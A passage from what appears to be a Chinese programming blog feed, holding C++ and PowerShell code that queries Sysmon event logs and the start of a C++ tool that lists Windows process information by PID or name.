operator">&amp;</span>dwPropertyCount<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] malloc failed.\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">)</span><span class="token punctuation">;</span>                errId <span class="token operator">=</span> ERROR_OUTOFMEMORY<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>errId <span class="token operator">!=</span> ERROR_SUCCESS<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] EvtRender failed.\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pRenderedContent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">delUnASCII</span><span class="token punctuation">(</span>pRenderedContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"%ls\n"</span><span class="token punctuation">,</span> pRenderedContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"==================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>pRenderedContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        errId <span class="token operator">=</span> ERROR_SUCCESS<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> errId<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 检测字符串是否为空</span>bool <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 比较两个字符串是否相同（忽略大小写）</span>bool <span class="token function">equal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    bool flag <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> true<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">stricmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// ASCII字符 -> 宽字符</span>LPWSTR <span class="token function">toLPWSTR</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> dwLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> nwLen <span class="token operator">=</span> <span class="token function">MultiByteToWideChar</span><span class="token punctuation">(</span>CP_ACP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> str<span class="token punctuation">,</span> dwLen<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    LPWSTR lpwstr <span class="token operator">=</span> new WCHAR<span class="token punctuation">[</span>dwLen<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">MultiByteToWideChar</span><span class="token punctuation">(</span>CP_ACP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> str<span class="token punctuation">,</span> dwLen<span class="token punctuation">,</span> lpwstr<span class="token punctuation">,</span> nwLen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> lpwstr<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 把非 ASCII 字符替换成 ?</span><span class="token keyword">void</span> <span class="token function">delUnASCII</span><span class="token punctuation">(</span>LPWSTR wstr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    wchar_t<span class="token operator">*</span> p <span class="token operator">=</span> wstr<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token string">'?'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        p<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PowerShell-源码"><a href="#PowerShell-源码" class="headerlink" title="PowerShell 源码"></a>PowerShell 源码</h2><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># get_sysmon_event.ps1</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># sysmon事件查询脚本</span><span class="token comment" spellcheck="true"># Powershell Script 3.0+</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># 脚本使用方式:</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   .\get_sysmon_event.ps1 -id 1 -limit 10 -h 0 -m -5 -s 0</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># id: sysmon事件ID （默认值1）</span><span class="token comment" spellcheck="true">#       1   Process Creation</span><span class="token comment" spellcheck="true">#       2   Process Changed a File Creation Time</span><span class="token comment" spellcheck="true">#       3   Network Connection</span><span class="token comment" spellcheck="true">#       4   Sysmon Service State Changed</span><span class="token comment" spellcheck="true">#       5   Process Terminated</span><span class="token comment" spellcheck="true">#       6   Driver Loaded</span><span class="token comment" spellcheck="true">#       7   Image Loaded</span><span class="token comment" spellcheck="true">#       8   Create Remote Thread</span><span class="token comment" spellcheck="true">#       9   Raw Access Read</span><span class="token comment" spellcheck="true">#       10  Process Access</span><span class="token comment" spellcheck="true">#       11  File Create</span><span class="token comment" spellcheck="true">#       12  Registry Event (Object Create and Delete)</span><span class="token comment" spellcheck="true">#       13  Registry Event (Value Set)</span><span class="token comment" spellcheck="true">#       14  Registry Event (Key and Value Rename)</span><span class="token comment" spellcheck="true">#       15  File Create Stream Hash</span><span class="token comment" spellcheck="true">#       16  Sysmon Configuration Change</span><span class="token comment" spellcheck="true">#       17  Named Pipe Created</span><span class="token comment" spellcheck="true">#       18  Named Pipe Connected</span><span class="token comment" spellcheck="true">#       255 Error</span><span class="token comment" spellcheck="true"># limit: 限制单次查询最多获取的事件数 （默认值100）</span><span class="token comment" spellcheck="true"># h: &lt;=0 的整数，标识查询 h 小时内的事件</span><span class="token comment" spellcheck="true"># m: &lt;=0 的整数，标识查询 m 分钟内的事件</span><span class="token comment" spellcheck="true"># s: &lt;=0 的整数，标识查询 s 秒内的事件</span><span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$id</span>=1<span class="token punctuation">,</span><span class="token namespace">[int]</span><span class="token variable">$limit</span>=100<span class="token punctuation">,</span><span class="token namespace">[int]</span><span class="token variable">$h</span>=0<span class="token punctuation">,</span><span class="token namespace">[int]</span><span class="token variable">$m</span>=5<span class="token punctuation">,</span><span class="token namespace">[int]</span><span class="token variable">$s</span>=0<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">-lt</span> 1<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$id</span>=1<span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$limit</span> <span class="token operator">-lt</span> 1<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$limit</span>=100<span class="token punctuation">}</span><span class="token variable">$args</span> = @<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">"logname"</span><span class="token punctuation">,</span> <span class="token string">"Microsoft-Windows-Sysmon/Operational"</span><span class="token punctuation">)</span><span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">"StartTime"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Date</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddHours<span class="token punctuation">(</span><span class="token operator">-</span><span class="token variable">$h</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddMinutes<span class="token punctuation">(</span><span class="token operator">-</span><span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddSeconds<span class="token punctuation">(</span><span class="token operator">-</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">"EndTime"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">Get-Date</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Get<span class="token operator">-</span>WinEvent <span class="token operator">-</span>FilterHashtable <span class="token variable">$args</span> <span class="token operator">-</span>MaxEvents <span class="token variable">$limit</span> <span class="token punctuation">|</span> <span class="token function">Format-Table</span> <span class="token operator">-</span>Property message <span class="token operator">-</span>Wrap<span class="token comment" spellcheck="true"># Get-WinEvent -FilterHashtable $args -MaxEvents $limit | Where{$_.Message -notmatch 'keyword'} | Format-Table -Property message -Wrap</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发/语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> PowerShell </tag>
            
            <tag> Sysmon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取 Windows 进程信息</title>
      <link href="/lang/getprocinfo/"/>
      <url>/lang/getprocinfo/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>PROCESSENTRY32 结构： <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32">https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32</a></li><li>MODULEENTRY32 结构： <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32">https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32</a></li></ul><blockquote><p><a href="../../download/get_process.zip">get_process.exe 下载</a></p></blockquote><h2 id="C-源码"><a href="#C-源码" class="headerlink" title="C++ 源码"></a>C++ 源码</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*************************************************************************************** * get_process.cpp *              * 进程信息查询脚本，使用方法: *   ./get_process.exe            :  查询当前所有进程信息 *   ./get_process.exe -id 1234   :  查询进程号为 1234 的进程信息 *   ./get_process.exe -name abcd :  查询进程名以 abcd 开头（忽略大小写）的进程信息 *  ***************************************************************************************/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;tlhelp32.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;tchar.h></span></span><span class="token comment" spellcheck="true">/* 进程信息结构体: https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32typedef struct tagPROCESSENTRY32 {　　DWORD dwSize;                    // 此进程的结构体大小（字节）　　DWORD cntUsage;                  // 进程的引用计数（已废弃，固定值0）　　DWORD th32ProcessID;             // 进程号　　ULONG_PTR th32DefaultHeapID;     // 默认堆ID（已废弃，固定值0）　　DWORD th32ModuleID;              // 进程模块ID（已废弃，固定值0）　　DWORD cntThreads;                // 此进程创建的线程数　　DWORD th32ParentProcessID;       // 父进程号　　LONG pcPriClassBase;             // 此进程所创建的线程优先级　　DWORD dwFlags;                   // （已废弃，固定值0）　　TCHAR szExeFile[MAX_PATH];       // 进程的可执行文件的名称（不含路径，完整路径可通过 MODULEENTRY32->szExePath 获取）} PROCESSENTRY32, *PPROCESSENTRY32;*/</span><span class="token comment" spellcheck="true">/* 进程模块结构体: https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32typedef struct tagMODULEENTRY32 {  DWORD   dwSize;                           // 此模块的结构体大小（字节）  DWORD   th32ModuleID;                     // 模块ID（已废弃，固定值1）  DWORD   th32ProcessID;                    // 所属进程的进程号  DWORD   GlblcntUsage;                     // 负载计数（通常没有意义，一般情况下值为 0xFFFF）  DWORD   ProccntUsage;                     // 与 GlblcntUsage 相同  BYTE    *modBaseAddr;                     // 该模块在所属进程中的基址  DWORD   modBaseSize;                      // 模块大小（字节）  HMODULE hModule;                          // 该模块在所属进程中的句柄  char    szModule[MAX_MODULE_NAME32 + 1];  // 模块名称  char    szExePath[MAX_PATH];              // 模块路径} MODULEENTRY32;*/</span><span class="token keyword">void</span> <span class="token function">printSysError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">// 打印系统异常</span><span class="token keyword">void</span> <span class="token function">printProc</span><span class="token punctuation">(</span>PROCESSENTRY32 pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打印进程信息到控制台</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">getProcessOwner</span><span class="token punctuation">(</span>DWORD pid<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 获取进程归属用户</span>bool <span class="token function">equal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 比较两个字符串是否相同（忽略大小写）</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">toChar</span><span class="token punctuation">(</span><span class="token keyword">const</span> wchar_t<span class="token operator">*</span> _wchar<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 宽字符 -> ASCII字符</span>bool <span class="token function">startwith</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> substr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 判断 str 是否以 substr 开头（忽略大小写）</span><span class="token comment" spellcheck="true">/** * argc: 入参个数(至少为1: 第0个为执行文件文件名) * argv: 入参列表。当 argc!=3 时打印所有进程; 当 argc==3 时: *   -id {pid} : 打印进程号为 pid 的进程信息 *   -name {pname} : 打印进程名为以 pname 开头的进程信息（忽略大小写，若有多个则只打印第一个） */</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 提取入参</span>    <span class="token keyword">int</span> exPid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 期望查询的进程号</span>    <span class="token keyword">char</span><span class="token operator">*</span> exPname <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 期望查询的进程名</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            exPid <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            exPname <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 拍摄当前系统所有进程快照</span>    HANDLE hProcess <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hProcess <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error] Fail to take processes snapshot.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printSysError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    PROCESSENTRY32 pe32<span class="token punctuation">;</span>    pe32<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>    BOOL hasNext <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Process32First</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 进程快照列表迭代器</span>    <span class="token comment" spellcheck="true">// 打印特定进程信息</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>exPid <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span>exPname<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        bool flag <span class="token operator">=</span> false<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>hasNext<span class="token punctuation">)</span> <span class="token punctuation">{</span>            DWORD pid <span class="token operator">=</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span>            <span class="token keyword">char</span><span class="token operator">*</span> pname <span class="token operator">=</span> <span class="token function">toChar</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> exPid<span class="token punctuation">)</span> <span class="token operator">==</span> pid <span class="token operator">||</span> <span class="token function">startwith</span><span class="token punctuation">(</span>pname<span class="token punctuation">,</span> exPname<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">printProc</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>                flag <span class="token operator">=</span> true<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            delete<span class="token punctuation">[</span><span class="token punctuation">]</span> pname<span class="token punctuation">;</span>            hasNext <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Process32Next</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> false<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error] The process is not exists.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 打印所有进程信息</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>hasNext<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printProc</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>            hasNext <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Process32Next</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 清除快照对象</span>    <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// system("pause");</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 打印系统异常</span><span class="token keyword">void</span> <span class="token function">printSysError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    DWORD errId<span class="token punctuation">;</span>    TCHAR errMsg<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    TCHAR<span class="token operator">*</span> p<span class="token punctuation">;</span>    errId <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">FormatMessage</span><span class="token punctuation">(</span>FORMAT_MESSAGE_FROM_SYSTEM <span class="token operator">|</span> FORMAT_MESSAGE_IGNORE_INSERTS<span class="token punctuation">,</span>                     <span class="token constant">NULL</span><span class="token punctuation">,</span> errId<span class="token punctuation">,</span>                     <span class="token function">MAKELANGID</span><span class="token punctuation">(</span>LANG_NEUTRAL<span class="token punctuation">,</span> SUBLANG_DEFAULT<span class="token punctuation">)</span><span class="token punctuation">,</span>                    errMsg<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p <span class="token operator">=</span> errMsg<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>p <span class="token operator">></span> <span class="token number">31</span> <span class="token operator">||</span> <span class="token operator">*</span>p <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">++</span>p<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token operator">*</span>p<span class="token operator">--</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span>p <span class="token operator">>=</span> errMsg <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span>p <span class="token operator">==</span> <span class="token string">'.'</span> <span class="token operator">||</span> <span class="token operator">*</span>p <span class="token operator">&lt;</span> <span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_tprintf</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"[Error %d] %s\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> errId<span class="token punctuation">,</span> errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 打印进程信息到控制台</span><span class="token 